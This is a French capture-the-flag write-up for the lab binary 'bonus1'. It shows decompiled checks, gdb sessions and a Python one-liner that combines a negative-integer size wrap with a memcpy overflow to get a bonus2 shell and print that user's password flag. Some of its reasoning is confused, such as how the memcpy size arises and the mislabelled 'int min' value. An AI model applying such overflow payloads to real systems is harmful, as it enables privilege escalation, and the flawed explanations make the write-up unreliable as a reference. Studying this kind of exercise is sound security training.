#  Shell Code Exploitation

En décompilant l'exécutable, on remarque que le programme doit passer 2 check pour executer un shell avec les droits de bonus2.

La première condition, est que notre premier argument doit-être inférieur à 10. 

```C
arg1 = atoi(argv[1]);
if (arg1 < 10) 
```
Notre deuxième condition est que notre premier argument soit égal à `0x574f4c46` soit `1464814662`en base 10.

```C
if (argv[1] == 0x574f4c46)
	execl("/bin/sh");
```

Entre ces deux conditions, il y a un `memcpy`, que nous allons utiliser afin de faire notre exploit. 

```C
memcpy(buffer, argv[2], (len(argv[1]) * 4));
```

En effet; le troisième argument de `memcpy` est un `size_t`

Il va donc falloir qu'on change la valeur de notre premier argument afin qu'elle coincide avec `0x574f4c46`.

Il s'avère qu'on a la possibilité de passer des nombres négatifs comme premier argument. En prenant un nombre très petit, on peut faire un `underflow`. Voyons tout ça dans `gdb`

```
> gdb ./bonus1
(gdb) disass main 
[...]
   0x08048470 <+76>:	mov    %eax,(%esp)
   0x08048473 <+79>:	call   0x8048320 <memcpy@plt>
   0x08048478 <+84>:	cmpl   $0x574f4c46,0x3c(%esp)
```
On voit un call a `memcpy`, on va donc break dessus et lancer le programme avec différentes valeurs.
```
(gdb) break *0x08048473
[...]
(gdb) r -200 A
[...]
(gdb) info registers
[...]
eax            0xbffff6c4	-1073744188
ecx            0xfffffce0	-800
edx            0xbffff8e7	-1073743641
```
On voit que `ecx` vaut bien `-800`. La multiplication par 4 dans le `memcpy` fonctionne donc bien.

Testons maintenant avec un nombre très petit.
```
(gdb) break *0x08048473
[...]
(gdb) r -2000000000 A
[...]
(gdb) info registers
[...]
eax            0xbffff6c4	-1073744188
ecx            0x2329b000	589934592
edx            0xbffff8e7	-1073743641
```

On voit que `ecx` vaut bien `589934592`.  On a donc réussi a `underflow`.
Néanmoins, on ne pourra pas réussir a obtenir la valeur de comparaison `1464814662` avec un `underflow`. On va donc prendre la valeur `d'int min`.

On sait que dans `memcpy`, la valeur du troisième argument est un `size_t`. Notre `int min` fait 11 caractères `-2147483624`. On va donc avoir :
```C
memcpy(buffer, argv[2], (11 * 4));
```

Voyons un peu ce qu'il se passe quand notre programme segfault.
On a notre premier argument, on va donc passer une grande chaine de caractère en deuxième argument et voir ce qu'il se passe.

```
(gdb) break *0x08048473
[...]
(gdb) r -2147483624 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
[...]
(gdb) c
[...]
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x39624138 in ?? ()
```

Notre programme `segfault`. Si on [calcule](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/) l'offset, on trouve 56.

On peut donc faire
```
[offset] - [len(premier argument)] - [adresse]
```

On a donc `56 - 11 - 4 = 40`

 Pour remplir notre buffer, on peut donc écrire 40 caractères puis l'adresse de comparaison, à savoir `0x574f4c46`.
 Cette adresse en little indian est donc `\x46\x4c\x4f\x57`.
 
On peut donc faire 
```
./bonus1 -2147483624 `python -c 'print "A"*40 + "\x46\x4c\x4f\x57"'`
[...]
$whoami
[...]
bonus2
$ cat /home/user/bonus2/.pass
[...]
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```